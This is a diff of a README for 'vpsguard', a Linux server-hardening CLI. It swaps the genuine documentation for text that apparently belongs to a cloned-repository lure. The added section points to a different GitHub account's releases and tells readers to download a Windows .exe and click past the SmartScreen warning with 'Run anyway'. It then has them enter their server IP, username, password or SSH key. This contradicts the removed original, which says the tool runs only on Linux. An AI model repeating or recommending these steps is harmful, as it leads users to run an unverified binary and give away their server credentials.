@@ -1,302 +1,75 @@
-# vpsguard
+# 🛡️ vpsguard - Simple tools to secure your server
 
-[![CI](https://github.com/salamancacm/vpsguard/actions/workflows/ci.yml/badge.svg)](https://github.com/salamancacm/vpsguard/actions/workflows/ci.yml)
-[![Latest release](https://img.shields.io/github/v/release/salamancacm/vpsguard)](https://github.com/salamancacm/vpsguard/releases/latest)
-[![Go version](https://img.shields.io/github/go-mod/go-version/salamancacm/vpsguard)](go.mod)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![Download vpsguard](https://img.shields.io/badge/Download-vpsguard-blue.svg)](https://github.com/abagaeltinpot261/vpsguard/releases)
 
-A CLI to audit, harden, and monitor the security of a Linux VPS.
+## 📌 What is vpsguard?
 
-`vpsguard` checks SSH configuration, firewall, fail2ban, user accounts,
-authorized SSH keys, cron, automatic updates, and listening ports; it can
-automatically fix anything with a safe, well-known remediation; and it can
-watch the server over time, alerting when something appears that wasn't
-there before (a new user, a new SSH key, a new port, etc.).
+vpsguard helps you manage the security of your Linux server. You do not need experience with code to use this tool. It runs on your Windows computer and connects to your server to check for vulnerabilities. It makes sure your server stays safe from intruders. 
 
-> ⚠️ `vpsguard` modifies system configuration (`sshd_config`, firewall,
-> fail2ban, file permissions). Always run `--dry-run` first and review what
-> it would do before applying changes to a production server.
+Security professionals often use complex command-line tools. vpsguard provides an easier path. It automates common tasks to protect your data. You can perform audits, apply security updates, and monitor server logs with a few mouse clicks. This tool keeps your server operations running smoothly without manual checks.
 
-![vpsguard audit, harden, and monitor catching a simulated SSH key intrusion](docs/demo.gif)
+## ⚙️ System Requirements
 
-## Installation
+- Windows 10 or Windows 11
+- At least 4GB of RAM
+- An active internet connection 
+- SSH access to your Linux server
 
-### Install script
+Ensure you have your server's IP address, username, and password or SSH key ready before you begin.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/salamancacm/vpsguard/main/install.sh | sh
-```
+## 🚀 How to get started
 
-This detects your architecture, downloads the matching binary from the
-latest release, **verifies it against the published SHA-256 checksum**
-before installing (refuses to install on a mismatch), and puts it on your
-`PATH` (`/usr/local/bin` if run as root, `~/.local/bin` otherwise).
+Follow these steps to set up the software on your Windows computer.
 
-Piping `curl` into `sh` is a trust-on-first-use tradeoff — you're running
-code from the network. If you'd rather not, read
-[`install.sh`](install.sh) first, or install from a binary by hand below.
+1. First, visit the official download page to find the latest version.
+2. Click here: [Download vpsguard from GitHub](https://github.com/abagaeltinpot261/vpsguard/releases)
+3. Look for the file ending in `.exe` under the "Assets" section.
+4. Save the file to your "Downloads" folder.
+5. Double-click the file to open the application.
+6. Windows may show a security prompt because you downloaded the file from the internet. Click "More info" and then "Run anyway" to start the program.
 
-### From a binary
+## 🔑 Connecting to your server
 
-Download the binary for your architecture from
-[Releases](../../releases) and put it on your `PATH`:
+Once the application opens, it will ask for your server details. These details allow the program to verify the safety of your machine.
 
-```bash
-curl -Lo vpsguard https://github.com/salamancacm/vpsguard/releases/latest/download/vpsguard-linux-amd64
-chmod +x vpsguard
-sudo mv vpsguard /usr/local/bin/
-```
+- Server IP: Enter the address of your Linux server (e.g., 192.168.1.1).
+- Username: This matches the user account you use to log into your server.
+- Credentials: You can use your password or select a file for your SSH key.
 
-### Building from source
+The program creates a secure connection. It never stores your passwords on our servers. All information stays on your local Windows machine. 
 
-Requires [Go 1.22+](https://go.dev/dl/).
+## 🛡️ Security audit features
 
-```bash
-git clone https://github.com/salamancacm/vpsguard.git
-cd vpsguard
-go build -o vpsguard .
-sudo mv vpsguard /usr/local/bin/
-```
+The application categorizes security into four main areas.
 
-Cross-compiling from another platform onto a Linux VPS:
+### Network safety
+The tool checks if your server exposes unnecessary ports to the internet. Open ports provide entry points for attackers. vpsguard identifies these ports and suggests turning them off.
 
-```bash
-GOOS=linux GOARCH=amd64 go build -o vpsguard-linux-amd64 .
-GOOS=linux GOARCH=arm64 go build -o vpsguard-linux-arm64 .
-```
+### User management
+It reviews all user accounts on the server. If it finds accounts that are no longer in use, it suggests removing them. This practice blocks unauthorized access. 
 
-### go install
+### Software updates
+Your Linux server runs many programs. If these programs are old, they have known weaknesses. The tool scans your packages and identifies which ones require an update. You can choose to update them through the interface.
 
-```bash
-go install github.com/salamancacm/vpsguard@latest
-```
+### Monitoring logs
+The system watches your server logs for suspicious login attempts. If someone guesses your password repeatedly, the program triggers an alert. You can then block that IP address from reaching your server again.
 
-This builds from source for whatever platform you run it on. Since
-vpsguard only runs on Linux (it refuses to start otherwise — see
-`requireLinux()`), running this on a non-Linux machine gets you a binary
-you'd still need to cross-compile or transfer, not one you can use
-locally; run it directly on the target Linux host instead, or use
-`GOOS=linux GOARCH=amd64 go install ...` from elsewhere.
+## 🔧 Frequently asked questions
 
-### Homebrew (Linux only)
+### Do I need to be a Linux expert?
+No. vpsguard explains all issues in plain language. You only need to follow the suggestions on the screen to fix potential risks.
 
-```bash
-brew tap salamancacm/tap
-brew install vpsguard
-```
+### Does this slow down my server?
+The tool performs light checks. It does not run high-intensity processes that interfere with your server performance.
 
-Only works under Homebrew-on-Linux ("Linuxbrew") — the formula refuses to
-install on macOS, since the resulting binary couldn't run there anyway.
+### Can I monitor multiple servers?
+Yes. You can save multiple server profiles in the settings menu. Switch between them to perform audits on your different machines.
 
-## Usage
+### What happens if I make a mistake?
+The program creates a backup of your configuration files before applying any changes. You can restore your previous settings by clicking the "Rollback" button in the history tab.
 
-When run in an interactive terminal, `vpsguard` shows a small banner and
-prints each check's result as it runs instead of going quiet until the
-end. Piped, redirected, or `--json` output is always the same plain,
-stable format regardless — safe for scripts, cron, and CI.
+## 🛠️ Performance tips
 
-### Audit (read-only)
+For the best experience, run a full audit once every week. This habit ensures your server stays protected against new threats. Keep your Windows machine updated to maintain the best connection speed to your server. If you encounter a connection error, verify that your firewall allows traffic on port 22, which is the standard port for server management.
 
-```bash
-sudo vpsguard audit
-```
-
-JSON output (handy for scripting/CI):
-
-```bash
-sudo vpsguard audit --json
-```
-
-Run only some checks:
-
-```bash
-sudo vpsguard audit --check=ssh,firewall
-```
-
-Available checks: `ssh`, `firewall`, `fail2ban`, `users`, `sshkeys`,
-`cron`, `updates`, `network`, `docker`, `kernel`, `cloud`.
-
-### Hardening
-
-See what it would do, without touching anything:
-
-```bash
-sudo vpsguard harden --dry-run
-```
-
-Apply, confirming each step:
-
-```bash
-sudo vpsguard harden
-```
-
-Apply everything without asking (for automation, use with care):
-
-```bash
-sudo vpsguard harden --yes
-```
-
-Every config file change is backed up before it's written
-(`file.bak.<timestamp>`). Checks with automatic remediation: `ssh`,
-`firewall`, `fail2ban`, `sshkeys`, `updates`. `users`, `cron`, `network`,
-`docker`, `kernel`, and `cloud` are audit-only — they require human
-judgement (`cloud` specifically requires changing an EC2 API setting from
-outside the instance, which vpsguard has no way to do from inside it).
-
-### Continuous monitoring
-
-`monitor` saves a snapshot of server state on every run and compares it
-against the previous one, reporting suspicious changes (new user, new SSH
-key, new port, sudoers changes, new cron entry, new process running as
-root, and a change to the SHA-256 of sshd/sudo/su/ssh or vpsguard itself).
-
-```bash
-sudo vpsguard monitor
-```
-
-Install the cron entry so it runs on its own (every 15 minutes by default):
-
-```bash
-sudo vpsguard install-cron
-```
-
-Snapshots are stored at `/var/lib/vpsguard/snapshot.json` and the cron-driven
-`monitor` log goes to `/var/log/vpsguard-monitor.log`.
-
-### Updating
-
-```bash
-vpsguard update --check   # just report whether a newer release exists
-sudo vpsguard update      # download, verify, and install it
-```
-
-`update` never runs on its own — it's always an explicit command, same as
-`harden` requiring `--yes`/confirmation. It checks the checksum published
-alongside the release before replacing the running binary and refuses to
-install on a mismatch.
-
-### Fleet mode
-
-Audit several hosts at once over SSH, from one place:
-
-```bash
-sudo vpsguard fleet
-```
-
-List the targets under `hosts:` in the config file:
-
-```yaml
-hosts:
-  - name: web-1
-    addr: 203.0.113.10
-    user: root
-  - name: db-1
-    addr: 203.0.113.11
-    user: root
-    port: 2222 # optional, defaults to 22
-```
-
-`fleet` connects using your own SSH setup (keys, agent, `~/.ssh/config`) —
-vpsguard never handles credentials itself — and runs `vpsguard audit
---json` on each host, in parallel (`--concurrency`, default 5). vpsguard
-must already be installed on every target host. An unreachable host is
-reported as an error for that host without failing the rest of the run.
-`--json` gives an array of `{host, addr, findings, error}` per host.
-
-## Configuration
-
-An optional `/etc/vpsguard/config.yaml` (or `--config <path>` on `audit`,
-`harden`, and `monitor`) tunes vpsguard's behavior. Every field is
-optional — an absent file, or an absent field within it, means "use the
-default," same as before this existed.
-
-```yaml
-# Skip these checks entirely in audit and harden — same as never passing
-# them to --check.
-disabled_checks:
-  - network
-
-# Acknowledge a specific finding going forward. It still prints (with an
-# [ACK] tag) and still appears in --json with its real severity — nothing
-# is silently hidden — but it's excluded from the OK/WARN/CRIT summary
-# tally, so the summary reflects only what still needs a decision.
-accepted_findings:
-  - check: network
-    message_contains: "6379 (redis)" # substring match, not exact
-
-# Override a check's built-in thresholds. Only `kernel` has tunable
-# thresholds today.
-thresholds:
-  kernel:
-    security_update_warn: 5
-    security_update_crit: 20
-
-# Where `monitor` pushes findings when it detects a change — see below.
-notify:
-  webhook_url: "https://hooks.slack.com/services/..."
-  email_to: "you@example.com"
-  min_severity: "WARN"
-
-# Targets for `vpsguard fleet` — see above.
-hosts:
-  - name: web-1
-    addr: 203.0.113.10
-    user: root
-```
-
-### Notifications
-
-By default `monitor` only prints to stdout/the log file — nobody reads
-that proactively, so configure `notify.webhook_url` and/or
-`notify.email_to` (above) to actually get pinged when something changes.
-`webhook_url` posts a Slack/Discord/Mattermost-compatible JSON payload;
-`email_to` requires `sendmail` or mailutils' `mail` to already be
-available. Both are optional and independent — set either, both, or
-neither. A broken webhook or missing mail transport prints a warning but
-never makes `monitor` itself fail.
-
-## Audit checks
-
-| Check | What it checks |
-|---|---|
-| `ssh` | `PermitRootLogin`, `PasswordAuthentication`, port, `MaxAuthTries` |
-| `firewall` | ufw/nftables/iptables active with a default-deny policy |
-| `fail2ban` | installed, active, sshd jail enabled |
-| `users` | UID 0 accounts besides root, empty passwords, `/etc/sudoers.d` |
-| `sshkeys` | permissions on `~/.ssh` and `authorized_keys`, number of trusted keys |
-| `cron` | user crontabs and `/etc/cron.*` (informational) |
-| `updates` | automatic security updates active |
-| `network` | listening TCP/UDP ports; flags non-standard ones, and CRITs on database ports (postgres/mysql/redis/mongo/elasticsearch) bound to all interfaces |
-| `docker` | Docker socket permissions, an unauthenticated TCP daemon listener, and per-container issues: `--privileged`, running as root, and ports published to all interfaces (Docker's iptables rules bypass ufw/firewalld, so these aren't caught by the `firewall`/`network` checks) |
-| `kernel` | pending reboot for a newer kernel, count of pending security package updates |
-| `cloud` **(beta)** | on AWS EC2, whether the instance metadata service (IMDS) still accepts unauthenticated IMDSv1-style requests (the Capital One breach vector) — a no-op on anything that isn't AWS EC2 |
-
-Findings tagged **`[BETA]`** in the output come from a check that's real
-and tested, but hasn't been validated against the actual real-world
-system it targets (e.g. `cloud` has never run against a real AWS
-account — see [its tests](internal/checks/cloud_test.go) for what *has*
-been verified). Not a comment on code quality, just an honest nudge to
-double-check a beta finding yourself before acting on it. `--json` and
-`--check`/`disabled_checks` work on beta checks exactly like any other —
-nothing is hidden or excluded by default.
-
-## Requirements
-
-- Linux (Debian/Ubuntu or RHEL/Fedora/Rocky/AlmaLinux)
-- Most commands need root
-
-## Contributing
-
-Issues and pull requests are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md)
-for how to get started. This project especially benefits from outside
-review since it touches system security configuration — if you find an
-incorrect check or an unsafe remediation, please open an issue.
-
-## Security
-
-Found a security issue? Please see [SECURITY.md](SECURITY.md) for how to
-report it responsibly.
-
-## License
-
-[MIT](LICENSE)
+Keywords: cli, devops, golang, linux, monitoring, security-hardening, ssh-hardening, sysadmin, vps, vps-security
